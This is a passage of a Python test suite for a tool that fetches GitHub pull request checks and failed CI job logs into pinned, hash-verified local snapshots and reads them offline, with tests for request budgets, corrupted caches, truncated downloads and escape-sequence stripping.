"""Evidence is acquired explicitly, then read from pinned local snapshots."""

import base64
import copy
import hashlib
import importlib.util
import json
import os
import shutil
import subprocess
import sys
from unittest.mock import patch
from pathlib import Path

from support import ROOT, Workspace, item, repository, summary


class EvidenceTests(Workspace):
    def setUp(self):
        super().setUp()
        self.seed_pr()

    def cache(self, command, *args):
        return self.json_cli("cache", command, *args)

    def inventory_row(self, number=1):
        row = summary(number=number, id=1000 + number, node_id=f"LIST_{number}")
        row.update(user=dict(login="author"), labels=[], created_at=row["updated_at"], pull_request=dict(url=f"https://api.github.com/repos/owner/repo/pulls/{number}"))
        return row

    def import_inventory(self, rows=None):
        self.responses["repos/owner/repo/issues?state=open&per_page=100&page=1"] = dict(data=rows if rows is not None else [self.inventory_row()])
        self.run_cli("fetch", "--cache-inventory")
        return self.cache("import-inventory")["snapshot_id"]

    def bulk_node(self, commit, **changes):
        """One PR as the bulk GraphQL reads return it, with the given head commit checks."""
        connection = dict(totalCount=0, pageInfo=dict(hasNextPage=False, endCursor=None), nodes=[])
        node = dict(id="PR_1", databaseId=101, number=1, url="https://github.com/owner/repo/pull/1", state="OPEN", updatedAt="2026-09-22T01:00:00Z",
                    baseRefOid="a" * 40, headRefOid="b" * 40, baseRefName="main", headRefName="fix", baseRepository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"),
                    headRepository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"), changedFiles=0, additions=0, deletions=0, isDraft=False, mergeable="MERGEABLE",
                    title="A contribution", body="Useful source text", comments=connection, files=connection, closingIssuesReferences=connection, commits=dict(nodes=[dict(commit=commit)]))
        node.update(changes)
        return node

    def bulk_batch(self, node):
        """Run acquire_batch for PR 1 against a fake GraphQL reader. Git is stubbed to fail, so code evidence stays partial and nothing is fetched."""
        (self.mock / "git").write_text("#!/bin/sh\nexit 1\n")
        (self.mock / "git").chmod(0o755)
        code = '''import json, sys
from _bulk import acquire_batch
from _cache import EvidenceCache
from _evidence import repository

class Reader:
    requests, budget, stopped = 0, 10, None

    def _request(self, path, graphql_query=None, graphql_variables=None):
        self.requests += 1
        node = json.loads(sys.argv[1])
        fork = (node.get("headRepository") or {}).get("nameWithOwner") not in (None, "owner/repo")
        if "forkCommit" in graphql_query and (graphql_variables["f0"], graphql_variables["h0"]) != (fork, node["headRefOid"]):
            sys.exit("the final read asked for the wrong fork head commit")
        return json.dumps(dict(data=dict(repository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo", p0=node), rateLimit=dict(remaining=100, resetAt=None)))), None

    def _json(self, body):
        return json.loads(body)

[(_, manifest)] = acquire_batch(EvidenceCache(repository("owner/repo", host="github.com")), Reader(), "pr", [dict(kind="pr", number=1)])
print(json.dumps(manifest))
'''
        env = dict(self.env, PYTHONPATH=str(self.root / "bin"))
        result = subprocess.run([sys.executable, "-c", code, json.dumps(node)], cwd=self.root, env=env, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0, result.stderr)
        return json.loads(result.stdout)

    def test_failed_job_logs_are_bounded_pinned_and_read_offline(self):
        sha = "b" * 40
        app = dict(id=11, slug="github-actions")
        suite = dict(id=10, head_sha=sha, app=app, status="completed", conclusion="failure", created_at="2026-09-22T02:00:00Z")
        check = dict(id=20, head_sha=sha, app=app, check_suite=dict(id=10), name="build", status="completed", conclusion="failure",
                     started_at="2026-09-22T02:00:00Z", completed_at="2026-09-22T02:01:00Z")
        prefix = f"repos/owner/repo/commits/{sha}"
        self.responses[prefix + "/check-suites?per_page=100&page=1"] = dict(data=dict(total_count=1, check_suites=[suite]))
        self.responses["repos/owner/repo/check-suites/10/check-runs?filter=all&per_page=100&page=1"] = dict(data=dict(total_count=1, check_runs=[check]))
        self.responses[prefix + "/statuses?per_page=100&page=1"] = dict(data=[])
        snapshot = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--mode", "refresh")["snapshot_id"]
        run = dict(id=30, run_attempt=2, head_sha=sha, check_suite_id=10, repository=repository(), url="https://api.github.com/repos/owner/repo/actions/runs/30", name="CI")
        job = dict(id=40, run_id=30, head_sha=sha, status="completed", conclusion="failure", name="test",
                   url="https://api.github.com/repos/owner/repo/actions/jobs/40", check_run_url="https://api.github.com/repos/owner/repo/check-runs/20")
        run_resource = "repos/owner/repo/actions/runs/30/attempts/2"
        job_resource = "repos/owner/repo/actions/jobs/40"
        discovery_resource = f"repos/owner/repo/actions/runs?check_suite_id=10&head_sha={sha}&per_page=100&page=1"
        self.responses[discovery_resource] = dict(data=dict(total_count=1, workflow_runs=[run]))
        self.responses[run_resource] = dict(data=run)
        self.responses[job_resource] = dict(data=job)
        self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=1, jobs=[job]))
        log = "".join(f"line {number}\n" if number != 50 else "error: expected 1, got 2\n" for number in range(1, 150))
        self.responses[job_resource + "/logs"] = dict(text=log)
        args = ("--expected-repo", "owner/repo", "--number", "1", "--snapshot", snapshot)
        located = self.json_cli("pr-check-log", "locate", *args, "--check-id", "20")
        self.assertEqual((located["run_id"], located["attempt"], located["job_id"]), (30, 2, 40))
        self.responses[discovery_resource]["data"]["total_count"] = 2
        self.run_cli("pr-check-log", "locate", *args, "--check-id", "20", ok=False)
        self.responses[discovery_resource]["data"]["total_count"] = 1
        combined = self.json_cli("pr-check-log", "capture", *args, "--check-id", "20")
        self.assertEqual((combined["status"], combined["capture_stage"]), ("retained", "fetch"))
        self.assertEqual((combined["requests"], combined["reserved_requests"], combined["request_budget"]), (8, 11, 20))
        self.assertLessEqual(combined["requests"] + combined["reserved_requests"], combined["request_budget"])

        for record_kind in ("raw job", "attempt membership"):
            for value in (3, "2", True, 2.0, None):
                self.responses[job_resource] = dict(data=copy.deepcopy(job))
                self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=1, jobs=[copy.deepcopy(job)]))
                if record_kind == "raw job":
                    self.responses[job_resource]["data"]["run_attempt"] = value
                else:
                    self.responses[run_resource + "/jobs?per_page=100&page=1"]["data"]["jobs"][0]["run_attempt"] = value

                with self.subTest(record_kind=record_kind, run_attempt=value):
                    unavailable = self.json_cli("pr-check-log", "capture", *args, "--check-id", "20")
                    self.assertEqual(unavailable["status"], "unavailable")
                    self.assertIn("run attempt", " ".join(unavailable["omissions"]))

        self.responses[job_resource] = dict(data=job)
        self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=1, jobs=[job]))
        combined_ref = combined["log_object"]
        combined_packet = json.loads((self.root / "data/owner/repo/cache/objects" / (combined_ref["sha256"] + ".json")).read_text())
        self.assertEqual(combined_packet["request_budget"], 17)
        before = len(self.calls())
        combined_view = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in combined_view["rows"] if row["source"] == "check-run")
        self.assertTrue(failed["log_capture_supported"])
        self.assertEqual(failed["failure_log"]["log_object"], combined_ref)
        self.assertEqual(len(self.calls()), before)
        online_args = ("--expected-repo", "owner/repo", "--number", "1", "--mode", "refresh", "--acquire-failure-logs", "--request-budget", "80")
        before_refresh = len(self.calls())
        refreshed = self.json_cli("pr-checks", *online_args)
        refreshed_log = next(row for row in refreshed["rows"] if row["source"] == "check-run")["failure_log"]
        self.assertEqual(refreshed["failure_log_acquisition"]["reused"], 1)
        self.assertEqual(refreshed_log["log_object"], combined_ref)
        self.assertEqual(refreshed_log["capture_snapshot_id"], snapshot)
        self.assertFalse(any(call[-1].endswith("/logs") for call in self.calls()[before_refresh:]))
        refreshed_args = ("--expected-repo", "owner/repo", "--number", "1", "--snapshot", refreshed["snapshot_id"])
        reused_read = self.json_cli("pr-check-log", "read", *refreshed_args, "--log-object", combined_ref["sha256"], "--log-bytes", str(combined_ref["bytes"]))
        self.assertEqual((reused_read["selected_snapshot_id"], reused_read["capture_snapshot_id"]), (refreshed["snapshot_id"], snapshot))
        if importlib.util.find_spec("reposition"):
            shutil.copytree(ROOT / "vendor/reposition", self.root / "vendor/reposition")
            self.assertTrue(self.json_cli("reposition-env", "enable")["enabled"])
            cache_root = self.root / "data/owner/repo/cache"
            ranked_before = {str(path.relative_to(cache_root)): path.read_bytes() for path in cache_root.rglob("*") if path.is_file()}
            ranked_calls = len(self.calls())
            indexed = self.cache("search-index", "--snapshot", refreshed["snapshot_id"], "--component", "ci_logs")
            self.assertEqual(indexed["coverage"]["ci_logs"]["captures"], 1)
            query = self.cache("query", "--snapshot", refreshed["snapshot_id"], "--component", "ci_logs", "--query", '"expected 1"')
            fragment = query["items"][0]["fragments"][0]
            retrieved = self.cache("retrieve", "--snapshot", refreshed["snapshot_id"], "--unit", fragment["unit_id"], "--checkpoint", query["checkpoint"])
            raw = retrieved["items"][0]["fragments"][0]
            self.assertTrue(raw["verified"])
            self.assertEqual(raw["component"], "ci_logs")
            self.assertEqual(raw["object"], combined_ref)
            self.assertEqual((raw["ci_log"]["selected_snapshot_id"], raw["ci_log"]["capture_snapshot_id"]), (refreshed["snapshot_id"], snapshot))
            segment = combined_packet["segments"][raw["locator"]["segment_index"]]
            segment_bytes = base64.b64decode(segment["content_base64"])
            excerpt = raw["excerpt"]
            self.assertEqual(excerpt["text"].encode(), segment_bytes[excerpt["start"]:excerpt["end"]])
            self.assertIn("error: expected 1, got 2", excerpt["text"])
            self.assertEqual((excerpt["original_start_byte"], excerpt["original_end_byte"]), (segment["start_byte"] + excerpt["start"], segment["start_byte"] + excerpt["end"]))
            self.assertEqual((raw["locator"]["original_start_line"], raw["locator"]["original_end_line"]), (segment["start_line"], segment["end_line"]))
            ranked_after = {str(path.relative_to(cache_root)): path.read_bytes() for path in cache_root.rglob("*") if path.is_file()}
            self.assertEqual(ranked_after, ranked_before)
            self.assertEqual(len(self.calls()), ranked_calls)

        reused_pointer = next(path for path in (self.root / "data/owner/repo/cache/ci-logs").glob("*.json") if json.loads(path.read_text())["scope"]["snapshot_id"] == refreshed["snapshot_id"])
        reused_pointer_bytes = reused_pointer.read_bytes()
        reused_pointer.write_text("corrupt")
        before_invalid = len(self.calls())
        invalid_current = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--mode", "cache-preferred", "--acquire-failure-logs")
        self.assertEqual(next(row for row in invalid_current["rows"] if row["source"] == "check-run")["failure_log"]["state"], "invalid")
        self.assertEqual(len(self.calls()), before_invalid)
        self.json_cli("pr-check-log", "read", *refreshed_args, "--log-object", combined_ref["sha256"], "--log-bytes", str(combined_ref["bytes"]))
        reused_pointer.write_bytes(reused_pointer_bytes)
        self.run_cli("pr-checks", *refreshed_args, "--acquire-failure-logs", ok=False)
        self.run_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--acquire-failure-logs", ok=False)

        # A dataset refresh then publishes checks read through GraphQL. The unchanged finished run is found through the latest-capture pointer, and its log is reused without a request.
        graphql_run = dict(databaseId=20, name="build", status="COMPLETED", conclusion="FAILURE", startedAt="2026-09-22T02:00:00Z", completedAt="2026-09-22T02:01:00Z", detailsUrl=None, url=None)
        graphql_suite = dict(databaseId=10, status="COMPLETED", conclusion="FAILURE", createdAt="2026-09-22T02:00:00Z", updatedAt="2026-09-22T02:01:00Z", app=dict(databaseId=11, slug="github-actions", name="GitHub Actions"),
                             repository=dict(id="R_repo", databaseId=42, nameWithOwner="owner/repo"), workflowRun=dict(databaseId=30, event="pull_request", workflow=dict(name="CI")),
                             checkRuns=dict(totalCount=1, pageInfo=dict(hasNextPage=False), nodes=[graphql_run]))
        bulk = self.bulk_batch(self.bulk_node(dict(oid=sha, checkSuites=dict(totalCount=1, pageInfo=dict(hasNextPage=False), nodes=[graphql_suite]), status=None)))
        before_bulk = len(self.calls())
        after_bulk = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--mode", "cache-preferred", "--acquire-failure-logs", "--include-failure-logs")
        self.assertEqual((after_bulk["snapshot_id"], after_bulk["requests"], after_bulk["failure_log_acquisition"]["reused"]), (bulk["snapshot_id"], 0, 1))
        bulk_log = next(row for row in after_bulk["rows"] if row["source"] == "check-run")["failure_log"]
        self.assertEqual((bulk_log["state"], bulk_log["log_object"], bulk_log["capture_snapshot_id"]), ("retained", combined_ref, snapshot))
        self.assertEqual(len(self.calls()), before_bulk)

        # A changed retained source requires a new capture instead of silently reusing the earlier bytes.
        check["name"] = "renamed build"
        changed_source = self.json_cli("pr-checks", *online_args)
        changed_log = next(row for row in changed_source["rows"] if row["source"] == "check-run")["failure_log"]
        self.assertEqual(changed_source["failure_log_acquisition"]["attempted"], 1)
        self.assertNotEqual(changed_log["log_object"], combined_ref)
        self.assertLessEqual(changed_source["requests"] + changed_source["reserved_requests"], 80)
        self.assertEqual(changed_source["failure_log_acquisition"]["requests"], 8)
        changed_args = ("--expected-repo", "owner/repo", "--number", "1", "--snapshot", changed_source["snapshot_id"])
        self.run_cli("pr-check-log", "read", *changed_args, "--log-object", combined_ref["sha256"], "--log-bytes", str(combined_ref["bytes"]), ok=False)
        check["name"] = "latest failed acquisition"
        self.responses[discovery_resource] = dict(status=404, data=dict(message="not found"))
        unavailable_latest = self.json_cli("pr-checks", *online_args)
        unavailable_log = next(row for row in unavailable_latest["rows"] if row["source"] == "check-run")["failure_log"]
        self.assertEqual(unavailable_log["state"], "missing")
        self.assertNotIn("log_object", unavailable_log)
        self.assertTrue(unavailable_latest["failure_log_acquisition"]["omissions"])
        self.responses[discovery_resource] = dict(data=dict(total_count=1, workflow_runs=[run]))
        check["name"] = "build"

        many_checks = [dict(check, id=index, name=f"failed job {index}") for index in range(21, 25)]
        many_jobs = [dict(job, id=index + 20, url=f"https://api.github.com/repos/owner/repo/actions/jobs/{index + 20}", check_run_url=f"https://api.github.com/repos/owner/repo/check-runs/{index}") for index in range(21, 25)]
        self.responses["repos/owner/repo/check-suites/10/check-runs?filter=all&per_page=100&page=1"] = dict(data=dict(total_count=4, check_runs=many_checks))
        self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=4, jobs=many_jobs))
        for one_job in many_jobs:
            one_resource = "repos/owner/repo/actions/jobs/" + str(one_job["id"])
            self.responses[one_resource] = dict(data=one_job)
            self.responses[one_resource + "/logs"] = dict(text=log)

        before_limited = len(self.calls())
        low_budget = self.json_cli("pr-checks", *online_args[:-1], "20")
        self.assertEqual(low_budget["failure_log_acquisition"]["attempted"], 0)
        self.assertLessEqual(low_budget["requests"] + low_budget["reserved_requests"], 20)
        self.assertFalse(any(call[-1].endswith("/logs") for call in self.calls()[before_limited:]))
        bounded_page = self.json_cli("pr-checks", *online_args)
        self.assertEqual(bounded_page["failure_log_acquisition"]["attempted"], 3)
        self.assertEqual(sum(row.get("failure_log", {}).get("state") == "retained" for row in bounded_page["rows"]), 3)
        self.assertLessEqual(bounded_page["requests"] + bounded_page["reserved_requests"], 80)
        self.assertTrue(bounded_page["failure_log_acquisition"]["omissions"])
        self.responses["repos/owner/repo/check-suites/10/check-runs?filter=all&per_page=100&page=1"] = dict(data=dict(total_count=1, check_runs=[check]))
        self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=1, jobs=[job]))

        limited = self.json_cli("pr-check-log", "capture", *args, "--check-id", "20", "--request-budget", "18")
        self.assertEqual((limited["status"], limited["reserved_requests"]), ("unavailable", 0))
        self.assertLessEqual(limited["requests"], 18)
        locate_failed = self.json_cli("pr-check-log", "capture", *args, "--check-id", "20", "--request-budget", "2")
        self.assertEqual((locate_failed["status"], locate_failed["capture_stage"], locate_failed["requests"]), ("unavailable", "locate", 2))
        self.assertNotIn("log_object", locate_failed)
        capture_args = (*args, "--check-id", "20", "--run-id", "30", "--attempt", "2", "--job-id", "40")
        captured = self.json_cli("pr-check-log", "fetch", *capture_args)
        self.assertEqual(captured["reserved_requests"], 11)
        self.assertLessEqual(captured["requests"] + captured["reserved_requests"], 20)
        self.assertEqual(captured["status"], "retained")
        self.assertEqual((captured["check_name"], captured["workflow_name"], captured["job_name"]), ("build", "CI", "test"))
        self.assertEqual((captured["request_budget"], captured["max_log_bytes"]), (20, 1048576))
        self.assertFalse(captured["download_partial"])
        self.assertEqual((captured["segments"][0]["start_line"], captured["segments"][0]["end_line"]), (40, 60))
        self.assertTrue(any("intervening" in omission for omission in captured["omissions"]))
        ref = captured["log_object"]
        read_args = (*args, "--log-object", ref["sha256"], "--log-bytes", str(ref["bytes"]))
        before = len(self.calls())
        metadata_only = self.json_cli("pr-checks", *args)
        failed = next(row for row in metadata_only["rows"] if row["source"] == "check-run")
        self.assertNotIn("failure_log", failed)
        displayed = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in displayed["rows"] if row["source"] == "check-run")
        self.assertEqual(failed["failure_log"]["state"], "retained")
        self.assertEqual(failed["failure_log"]["log_object"], ref)
        self.assertEqual(sum(len(window["text"].splitlines()) for window in failed["failure_log"]["windows"]), 20)
        self.assertLessEqual(sum(len(window["text"].encode("utf-8")) for window in failed["failure_log"]["windows"]), 8192)
        pointer_path = next(path for path in (self.root / "data/owner/repo/cache/ci-logs").glob("*.json")
                            if (scope := json.loads(path.read_text())["scope"])["snapshot_id"] == snapshot
                            and scope["source_repository"] == "owner/repo" and scope["check_id"] == 20)
        saved_pointer = pointer_path.read_bytes()
        pointer_path.write_text("corrupt")
        invalid_display = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in invalid_display["rows"] if row["source"] == "check-run")
        self.assertEqual(failed["failure_log"]["state"], "invalid")
        foreign_pointer = json.loads(saved_pointer)
        foreign_pointer["scope"]["source_repository"] = "foreign/repo"
        pointer_path.write_text(json.dumps(foreign_pointer))
        invalid_source = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in invalid_source["rows"] if row["source"] == "check-run")
        self.assertEqual(failed["failure_log"]["state"], "invalid")
        pointer_path.write_bytes(saved_pointer)
        offline = self.json_cli("pr-check-log", "read", *read_args, "--start-line", "45", "--max-lines", "10")
        self.assertIn("line 45\n", offline["windows"][0]["text"])
        self.assertIn("error: expected 1, got 2", offline["windows"][0]["text"])
        self.assertNotIn("content_base64", json.dumps(offline))
        self.assertNotIn("run", offline["packet"])
        self.run_cli("pr-check-log", "read", *read_args, "--start-line", "5", ok=False)
        self.run_cli("pr-check-log", "read", *read_args, "--job-id", "20", ok=False)
        self.run_cli("pr-check-log", "read", *read_args, "--source-repo", "other/repo", ok=False)
        object_path = self.root / "data/owner/repo/cache/objects" / (ref["sha256"] + ".json")
        saved_packet = object_path.read_bytes()
        object_path.write_bytes(saved_packet.replace(b'"head_sha":"b', b'"head_sha":"a', 1))
        self.run_cli("pr-check-log", "read", *read_args, ok=False)
        corrupt_capture = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in corrupt_capture["rows"] if row["source"] == "check-run")
        self.assertEqual(failed["failure_log"]["state"], "invalid")
        object_path.write_bytes(saved_packet)
        foreign_packet = json.loads(saved_packet)
        foreign_packet["head_sha"] = "a" * 40
        foreign_payload = (json.dumps(foreign_packet, ensure_ascii=False, sort_keys=True, separators=(",", ":")) + "\n").encode("utf-8")
        foreign_sha = hashlib.sha256(foreign_payload).hexdigest()
        object_path.with_name(foreign_sha + ".json").write_bytes(foreign_payload)
        self.run_cli("pr-check-log", "read", *args, "--log-object", foreign_sha, "--log-bytes", str(len(foreign_payload)), ok=False)
        self.assertEqual(len(self.calls()), before)

        new_snapshot = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--mode", "refresh")["snapshot_id"]
        self.assertNotEqual(snapshot, new_snapshot)
        before = len(self.calls())
        missing_display = self.json_cli("pr-checks", "--expected-repo", "owner/repo", "--number", "1", "--snapshot", new_snapshot, "--include-failure-logs")
        failed = next(row for row in missing_display["rows"] if row["source"] == "check-run")
        self.assertEqual(failed["failure_log"]["state"], "missing")
        self.assertEqual(len(self.calls()), before)

        truncated = self.json_cli("pr-check-log", "fetch", *capture_args, "--max-log-bytes", "60")
        self.assertTrue(truncated["download_partial"])
        self.assertEqual(truncated["observed_bytes"], 60)
        self.assertTrue(any("observed prefix" in omission for omission in truncated["omissions"]))
        before = len(self.calls())
        newer_display = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in newer_display["rows"] if row["source"] == "check-run")
        self.assertEqual(failed["failure_log"]["log_object"], truncated["log_object"])
        self.assertTrue(failed["failure_log"]["download_partial"])
        self.assertEqual(len(self.calls()), before)
        fake_path = self.mock / "gh"
        original_fake = fake_path.read_text()
        interrupted_fake = original_fake.replace('print(response["text"] if "text" in response else json.dumps(response.get("data")))',
                                                 'if endpoint.endswith("/logs"):\n    sys.stdout.write(response["text"])\n    sys.stderr.write("private transport diagnostic must not become evidence")\n    sys.exit(1)\nprint(response["text"] if "text" in response else json.dumps(response.get("data")))')
        self.assertNotEqual(interrupted_fake, original_fake)
        fake_path.write_text(interrupted_fake)
        for observed in ("", "error: interrupted log\n"):
            self.responses[job_resource + "/logs"] = dict(text=observed)
            interrupted = self.json_cli("pr-check-log", "fetch", *capture_args)
            self.assertEqual(interrupted["status"], "retained" if observed else "unavailable")
            self.assertEqual(interrupted["observed_bytes"], len(observed))
            self.assertTrue(interrupted["download_partial"])
            self.assertTrue(interrupted["binding_revalidated"])
            self.assertEqual(interrupted["omissions"], ["log download ended unsuccessfully"] +
                             (["download is an observed prefix; complete job log coverage is unknown"] if observed else []))
            interrupted_ref = interrupted["log_object"]
            interrupted_packet = (self.root / "data/owner/repo/cache/objects" / (interrupted_ref["sha256"] + ".json")).read_text()
            self.assertNotIn("private transport diagnostic", interrupted_packet)
            before = len(self.calls())
            interrupted_view = self.json_cli("pr-checks", *args, "--include-failure-logs")
            failed = next(row for row in interrupted_view["rows"] if row["source"] == "check-run")
            self.assertEqual(failed["failure_log"]["log_object"], interrupted_ref)
            self.assertEqual(failed["failure_log"]["state"], interrupted["status"])
            self.assertEqual(len(self.calls()), before)

        fake_path.write_text(original_fake)
        ansi_log = "\x1b[31merror: colored failure\x1b[0m\n"
        self.responses[job_resource + "/logs"] = dict(text=ansi_log)
        for raw_supported in ("1", "0"):
            self.env["FAKE_GH_ALLOW_ESCAPE_SEQUENCES"] = raw_supported
            before = len(self.calls())
            colored = self.json_cli("pr-check-log", "fetch", *capture_args)
            log_call = next(call for call in self.calls()[before:] if call[-1] == job_resource + "/logs")
            self.assertEqual("--allow-escape-sequences" in log_call, raw_supported == "1")
            self.assertFalse(colored["download_partial"])
            colored_ref = colored["log_object"]
            colored_packet = json.loads((self.root / "data/owner/repo/cache/objects" / (colored_ref["sha256"] + ".json")).read_text())
            self.assertEqual(base64.b64decode(colored_packet["segments"][0]["content_base64"]), (ansi_log + "\n").encode("utf-8"))
            colored_view = self.json_cli("pr-checks", *args, "--include-failure-logs")
            failed = next(row for row in colored_view["rows"] if row["source"] == "check-run")
            self.assertIn("error: colored failure", failed["failure_log"]["windows"][0]["text"])
            self.assertNotIn("\x1b", failed["failure_log"]["windows"][0]["text"])
            self.assertNotIn("[31m", failed["failure_log"]["windows"][0]["text"])

        grouped_log = "2026-09-22T02:00:00Z ##[group]Install dependencies\nsetup\n##[endgroup]\n2026-09-22T02:00:01Z ##[group]Run tests\nerror: failed test\n##[endgroup]\n"
        self.responses[job_resource + "/logs"] = dict(text=grouped_log)
        grouped = self.json_cli("pr-check-log", "fetch", *capture_args)
        grouped_read = self.json_cli("pr-check-log", "read", *args, "--log-object", grouped["log_object"]["sha256"], "--log-bytes", str(grouped["log_object"]["bytes"]))
        self.assertEqual([window["section_title"] for window in grouped_read["windows"]], ["Install dependencies", "Run tests"])
        self.assertEqual([window["start_line"] for window in grouped_read["windows"]], [1, 4])

        self.env.pop("FAKE_GH_ALLOW_ESCAPE_SEQUENCES")
        self.responses[job_resource + "/logs"] = dict(text="x" * 100000)
        long_line = self.json_cli("pr-check-log", "fetch", *capture_args, "--max-log-bytes", "60000")
        self.assertFalse(long_line["segments"][0]["last_line_complete"])
        long_display = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in long_display["rows"] if row["source"] == "check-run")
        self.assertEqual(sum(len(window["text"].encode("utf-8")) for window in failed["failure_log"]["windows"]), 8192)
        self.assertTrue(failed["failure_log"]["windows"][0]["display_truncated"])
        first_window = "error: first " + "x" * (8192 - len("error: first \n") - 10 * len("ctx\n")) + "\n" + "ctx\n" * 10
        self.assertEqual(len(first_window.encode("utf-8")), 8192)
        self.responses[job_resource + "/logs"] = dict(text=first_window + "ctx\n" * 88 + "error: second\n" + "ctx\n" * 20)
        self.json_cli("pr-check-log", "fetch", *capture_args)
        exact_display = self.json_cli("pr-checks", *args, "--include-failure-logs")
        failed = next(row for row in exact_display["rows"] if row["source"] == "check-run")
        self.assertEqual(failed["failure_log"]["continuation"]["start_line"], 90)
        self.assertEqual(len(failed["failure_log"]["windows"]), 1)

        self.responses[job_resource + "/logs"] = dict(text="".join(f"context {number}\n" for number in range(1, 150)))
        context = self.json_cli("pr-check-log", "fetch", *capture_args)
        context_ref = context["log_object"]
        bounded = self.json_cli("pr-check-log", "read", *args, "--log-object", context_ref["sha256"], "--log-bytes", str(context_ref["bytes"]), "--max-lines", "5")
        self.assertEqual(sum(len(window["text"].splitlines()) for window in bounded["windows"]), 5)
        self.assertEqual(bounded["continuation"]["start_line"], 6)
        self.assertEqual(bounded["continuation"]["log_object"], context_ref)
        self.responses[job_resource + "/logs"] = dict(text=log)
        fake_path = self.mock / "gh"
        original_fake = fake_path.read_text()
        changing_fake = original_fake.replace('response = responses[endpoint]\n', 'response = responses[endpoint]\nif endpoint.endswith("/logs"):\n    responses["' + run_resource + '"]["data"]["name"] = "Changed during download"\n    (root / "responses.json").write_text(json.dumps(responses))\n')
        self.assertNotEqual(changing_fake, original_fake)
        fake_path.write_text(changing_fake)
        changed = self.json_cli("pr-check-log", "fetch", *capture_args)
        self.assertEqual(changed["status"], "retained")
        self.assertFalse(changed["binding_revalidated"])
        self.assertTrue(changed["download_partial"])
        self.assertTrue(any("changed during capture" in omission for omission in changed["omissions"]))
        fake_path.write_text(original_fake)
        budgeted = self.json_cli("pr-check-log", "fetch", *capture_args, "--request-budget", "6")
        self.assertEqual((budgeted["status"], budgeted["reserved_requests"]), ("unavailable", 0))
        self.assertTrue(any("budget" in omission for omission in budgeted["omissions"]))
        self.responses[job_resource] = dict(data=dict(job, check_run_url="https://api.github.com/repos/owner/repo/check-runs/999"))
        before = len(self.calls())
        self.run_cli("pr-check-log", "fetch", *capture_args, ok=False)
        self.assertFalse(any(job_resource + "/logs" in call for call in self.calls()[before:]))
        self.responses[job_resource] = dict(data=job)
        self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=0, jobs=[]))
        self.run_cli("pr-check-log", "fetch", *capture_args, ok=False)
        self.run_cli("pr-check-log", "locate", *args, "--check-id", "20", ok=False)
        self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=1, jobs=[job]))
        self.responses[run_resource] = dict(data=dict(run, repository="foreign"))
        self.run_cli("pr-check-log", "fetch", *capture_args, ok=False)
        self.responses[run_resource] = dict(data=run)
        for expired_status in (404, 410):
            self.responses[job_resource + "/logs"] = dict(status=expired_status, text="expired log body")
            expired = self.json_cli("pr-check-log", "fetch", *capture_args)
            self.assertEqual(expired["status"], "unavailable")
            self.assertTrue(expired["download_partial"])
            self.assertTrue(any(f"HTTP {expired_status}" in omission for omission in expired["omissions"]))
            self.assertEqual(expired["segments"], [])
            expired_view = self.json_cli("pr-checks", *args, "--include-failure-logs")
            failed = next(row for row in expired_view["rows"] if row["source"] == "check-run")
            self.assertEqual(failed["failure_log"]["state"], "unavailable")
            self.assertEqual(failed["failure_log"]["log_object"], expired["log_object"])

        self.responses[job_resource + "/logs"] = dict(text=log)
        for record_kind in ("raw job", "attempt membership"):
            self.responses[job_resource] = dict(data=dict(job))
            self.responses[run_resource + "/jobs?per_page=100&page=1"] = dict(data=dict(total_count=1, jobs=[dict(job)]))
            if record_kind == "raw job":
                self.responses[job_resource]["data"]["run_attempt"] = 2
            else:
                self.responses[run_resource + "/jobs?per_page=100&page=1"]["data"]["jobs"][0]["run_attempt"] = 2

            with self.subTest(record_kind=record_kind, run_attempt=2):
                accepted = self.json_cli("pr-check-log", "fetch", *capture_args)
                self.assertEqual(accepted["status"], "retained")

        self.responses[job_resource + "/logs"] = dict(status=403, text="private error body must not become log evidence")
        denied = self.json_cli("pr-check-log", "fetch", *capture_args)
        self.assertEqual(denied["status"], "unavailable")
        self.assertFalse(denied["binding_revalidated"])
        self.assertTrue(any("HTTP 403" in omission for omission in denied["omissions"]))
        before = len(self.calls())
        self.run_cli("pr-check-log", "fetch", *capture_args, ok=False)
        self.assertEqual(len(self.calls()), before)
        self.assertFalse((self.root / "data/owner/repo/ledger.jsonl").exists())

    def test_missing_offline_read_does_not_fetch_or_initialize(self):
        result = self.cache("read", "--kind", "pr", "--number", "1", "--profile", "discussion")
        self.assertIsNone(result["snapshot_id"])
        self.assertEqual(result["problems"]["summary"], ["missing"])
        self.assertEqual(self.calls(), [])
        self.assertFalse((self.root / "data/owner/repo/cache").exists())

    def test_pr_checks_keep_coverage_results_history_and_source_scope_separate(self):
        args = ("--expected-repo", "owner/repo", "--number", "1")
        missing = self.json_cli("pr-checks", *args)
        self.assertEqual((missing["coverage"], missing["observed_result"], missing["rows"]), ("missing", "unknown", []))
        self.assertEqual(self.calls(), [])
        self.assertFalse((self.root / "data/owner/repo/cache").exists())
        sha = "b" * 40
        prefix = f"repos/owner/repo/commits/{sha}"
        app = dict(id=11, name="CI")

        def suite(identifier=10, **changes):
            return dict(dict(id=identifier, head_sha=sha, app=app, status="completed", conclusion="success", created_at="2026-09-22T02:00:00Z"), **changes)

        def run(identifier=20, **changes):
